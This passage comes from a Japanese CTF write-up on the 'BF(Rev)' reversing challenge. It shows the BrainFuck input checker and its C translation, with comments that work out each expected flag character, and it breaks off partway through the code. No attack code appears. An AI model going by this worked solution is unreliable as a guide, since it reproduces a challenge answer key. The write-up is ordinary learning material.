/static/3450f870f83ca4dec79e1470b462613e/d3be9/image-20240720114932487.webp 480w,
/static/3450f870f83ca4dec79e1470b462613e/76c9f/image-20240720114932487.webp 803w"
              sizes="(max-width: 803px) 100vw, 803px"
              type="image/webp"
            />
          <source
            srcset="/static/3450f870f83ca4dec79e1470b462613e/8ff5a/image-20240720114932487.png 240w,
/static/3450f870f83ca4dec79e1470b462613e/e85cb/image-20240720114932487.png 480w,
/static/3450f870f83ca4dec79e1470b462613e/e1031/image-20240720114932487.png 803w"
            sizes="(max-width: 803px) 100vw, 803px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/3450f870f83ca4dec79e1470b462613e/e1031/image-20240720114932487.png"
            alt="image-20240720114932487"
            title="image-20240720114932487"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="bfrev" style="position:relative;"><a href="#bfrev" aria-label="bfrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>BF(Rev)</h2>
<blockquote>
<p>Simple equations… but in BF?!!!</p>
</blockquote>
<p>問題バイナリとして BrainFuck のコードが与えられます。</p>
<div class="gatsby-highlight" data-language="txt"><pre class="language-txt"><code class="language-txt">,>>+++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;-------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++[&lt;++++++++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;--------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;--------------------------------------------------------------------------------------------------------[>&lt;],>>++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;-------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;--------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;-------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;+++++++>-]&lt;[-&lt;+>]&lt;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++++++[&lt;++++++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;---------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++[&lt;++++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++++++++[&lt;++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;----------------------------------------------------------------------------------------------------------------------[>&lt;],>>+++++++++++++++++++[&lt;+++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;],>>++++++[&lt;+++++>-]&lt;[-&lt;+>]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------[>&lt;]</code></pre></div>
<p>このままではとても読めたものではないので、bftoc を使用して C 言語に置き換えます。</p>
<p>参考：<a href="https://github.com/paulkaefer/bftoc/blob/master/bftoc.py" target="_blank" rel="nofollow noopener noreferrer">bftoc/bftoc.py at master · paulkaefer/bftoc · GitHub</a></p>
<p>デコード結果は以下のようになりました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/* This is a translation of bf.txt, generated by bftoc.py (by Paul Kaefer)
 * It was generated on Saturday, July 20, 2024 at 04:18AM
 */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> tape<span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token comment">/* Clearing the tape (array) */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        tape<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment">// chr(138-3*11)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">138</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">// chr(169-7*10)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">169</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(160-11*4)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">160</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(172-10*7)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">172</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(174-17*3)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">17</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">174</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(113-8*8)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">113</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(160-13*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">160</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(148-11*4)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">148</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token comment">// chr(82-6*5)</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ptr <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        tape<span class="token punctuation">[</span>ptr<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
